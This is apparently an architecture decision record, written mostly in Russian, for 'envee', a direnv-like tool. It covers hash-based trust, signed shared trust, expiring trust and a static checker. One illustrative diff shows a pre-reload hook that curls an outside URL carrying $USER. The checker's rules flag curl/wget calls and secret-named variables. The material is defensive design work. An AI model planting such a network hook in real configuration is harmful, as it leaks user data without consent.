# ADR-004: Trust model — content-hash + opt signature

- **Статус**: Accepted
- **Дата**: 2026-09-08
- **Решает**: Как пользователь явно одобряет `.envee.toml` и какие гарантии это даёт

## Контекст

У direnv есть `allow`/`deny` через `~/.config/direnv/{allow,deny}/<hash>`. Это:
- ✅ Защищает от случайного выполнения неtrusted файла.
- ❌ Hash считается от `absolute path + content` → переезд проекта инвалидирует allow.
- ❌ Trust-файлы лежат в `~/.config/direnv/allow/`, который может случайно синкаться в облако (iCloud/Dropbox/syncthing).
- ❌ Нет подписи — нельзя «поделиться» trust'ом с командой.
- ❌ Нет статического анализа — `direnv allow` это слепое одобрение bash-кода.

## Решение

**Двухуровневая trust-семантика**:
1. **Per-file trust** (аналог direnv): пользователь делает `envee trust`, файл помечается в trust-store по `sha256(content)`.
2. **Opt-in cryptographic signature** (`envee trust --sign`): trust-запись подписывается ed25519 ключом, может быть расшарена с командой.

### Что хранится в trust-store

**Путь**: `$XDG_DATA_HOME/envee/trust/<sha256>.json` (по умолчанию `~/.local/share/envee/trust/`).

Это **`XDG_DATA_HOME`, не `XDG_CONFIG_HOME`**, чтобы избежать случайного sync в iCloud/Dropbox (которые чаще настроены на `~/.config/`). User может переопределить через `ENVEE_TRUST_DIR`.

**Формат**:

```json
{
  "version": 1,
  "file_hash": "sha256:abc123...",          // sha256 of canonical content (sorted keys)
  "file_path": "/Users/alice/work/myproj/envee.toml",
  "trusted_at": "2026-09-08T09:30:00Z",
  "trusted_by": "alice",                     // $USER
  "tool_version": "0.1.0",                   // версия envee, чтобы trust не был «вечным»
  "signature": {                             // OPTIONAL, только если --sign
    "algorithm": "ed25519",
    "key_id": "sha256:def456...",            // fingerprint public key
    "value": "base64-signature-bytes...",
    "signed_at": "2026-09-08T09:30:00Z"
  },
  "comment": "verified by reviewer @bob"    // OPTIONAL
}
```

**Подпись** (если есть) покрывает JSON-канонизацию всех полей кроме самого `signature` (deterministic JSON: sorted keys, no whitespace).

### Canonical content hash

```go
// internal/trust/hash.go
func CanonicalHash(tomlBytes []byte) (string, error) {
    var v interface{}
    if err := toml.Unmarshal(tomlBytes, &v); err != nil { return "", err }
    canonical, _ := toml.Marshal(v)  // BurntSushi/toml по дефолту даёт sorted keys
    sum := sha256.Sum256(canonical)
    return "sha256:" + hex.EncodeToString(sum[:]), nil
}
```

**Почему canonical hash, а не raw content**:
- `envee.toml` редактируется в разных редакторах, которые могут по-разному сериализовать ключи/пробелы.
- Если user добавил только trailing whitespace — не хочется re-approval.
- Canonical hash стабилен к форматированию, чувствителен к **семантическому** содержимому.

### `envee trust` — UX

```bash
$ envee trust
Trust this envee.toml? [Y/n/d(iff)] y
Trusted.
  path:    /Users/alice/work/myproj/envee.toml
  hash:    sha256:abc123...
  expires: never (use --ttl=7d for time-bounded trust)

# Diff перед одобрением — критично для security
$ envee trust
Trust this envee.toml? [Y/n/d(iff)] d
--- envee.toml (new)
+++ envee.toml (trusted)
@@ -0,0 +1,42 @@
+[env]
+DATABASE_URL = "postgres://localhost/dev"
+_.path = ["./node_modules/.bin"]
+
+[_.secret.AWS]
+source = "aws"
+profile = "dev"
+
+_.script = "./untrusted.wasm"   # ⚠ unknown script
+
+[scripts]
+pre_reload = "curl https://example.com/track?id=$USER"  # ⚠ network call!
```

Static analyzer (`envee check`) подсвечивает подозрительные места **до** trust'а.

### `envee check` — static analysis

Выполняется **перед** запросом trust'а. Возвращает:
- **Errors** (блокируют trust):
  - `_.script` ссылается на path, который не существует.
  - `_.secret.X.source` неизвестен (нет такого плагина).
  - `required = true` для переменной, не имеющей default и не в `_.file`.
- **Warnings** (не блокируют):
  - `_.script` ссылается на `.wasm` файл вне `config_root` (escapes sandbox scope).
  - `[scripts].pre_reload` или `[scripts].post_reload` содержит сетевые вызовы.
  - `redact = true` отсутствует у переменных, имя которых содержит `KEY`/`SECRET`/`TOKEN`/`PASSWORD`/`CREDENTIAL`.

Вывод в формате:
```
$ envee check envee.toml
ERROR  _.secret.AWS: source "aws-cli" not installed. Run `envee plugin install aws`.
WARN   scripts.pre_reload: contains network call (curl/wget). Add 'allow_network = true' to .wasm script metadata.
WARN   API_KEY: variable name suggests secret, but redact=false.
OK     2 errors, 2 warnings, 18 values resolved.
```

### `envee deny` — explicit revoke

```bash
$ envee deny /Users/alice/work/myproj
# Создаёт запись в trust/deny/<path-hash>.json
# Блокирует загрузку envee.toml в этой директории (и сабдиректориях) до явного un-deny.
```

`envee deny --remove` — un-deny.

### Time-bounded trust

```bash
$ envee trust --ttl=24h        # expires через сутки
$ envee trust --ttl=7d         # expires через неделю
$ envee trust --ttl=never      # default, expires никогда
```

Полезно для:
- Demo-проектов.
- Временного contractor'а.
- CI-runner'ов, где want short-lived approval.

Expired trust → файл снова blocked, требует re-trust.

### Shared trust (для команд)

**Workflow**:
1. Bob делает `envee trust --sign --key ~/.ssh/id_ed25519`.
2. Bob коммитит `envee.trust.json` (или расшаривает через gist).
3. Alice делает `envee trust --verify --from ./envee.trust.json --public-key <bob's pub>`.
4. Envee проверяет подпись → если OK, добавляет trust-entry.
5. В дальнейшем `envee status` показывает: `signed by: bob (verified 2026-09-08)`.

**Trust verification в CI**:
- `envee --require-trust --public-key path/to/key.pub exec -- ...` — fail, если нет valid signature.
- Полезно для security-sensitive проектов.

### Trust-store encryption (Phase 3)

В v2.x — опционально шифруем trust-store через OS keyring (Keychain на macOS, Secret Service на Linux, DPAPI на Windows). Ключ генерируется при первом `envee trust` и сохраняется в keyring.

Для v1.x — trust-store в plain JSON в `XDG_DATA_HOME` (не синкается по умолчанию).

## Migration от direnv

`envee migrate-from-direnv`:
1. Читает `~/.config/direnv/allow/<hash>` файлы.
2. Перечитывает соответствующие `.envrc` файлы.
3. Хеширует → создаёт trust-записи.
4. Удаляет (опционально) `direnv allow` файлы после успешной миграции.

**Caveat**: `direnv allow` — это sha256(`absolute_path + content`), наш — `sha256(canonical content)`. Совместимости не будет, нужно re-hash. Это OK для one-time migration.

## Безопасность trust-store

- **Path**: `$XDG_DATA_HOME/envee/trust/` (НЕ `$XDG_CONFIG_HOME`).
- **Permissions**: `0700` на директорию, `0600` на файлы.
- **Symlink check**: при записи проверяем, что target — не symlink.
- **Atomic write**: через `tempfile` + `rename`, чтобы не было partial write.

## Последствия

### Положительные

- Trust по **семантическому** содержимому, не по форматированию.
- Не конфликтует с iCloud/Dropbox (`XDG_DATA_HOME`, не `CONFIG_HOME`).
- Signature для shared trust.
- Time-bounded trust для ephemeral проектов.
- Static analysis **до** trust'а.

### Отрицательные

- Signature workflow сложнее, чем `direnv allow` — нужна документация.
- `envee check` в MVP может быть поверхностным; в v1.x расширяем.

### Нейтральные

- Trust-store в plain JSON в MVP; encryption в v2.
- Canonical hash через `BurntSushi/toml` re-marshal — не 100% гарантия стабильности через major versions (мониторим).
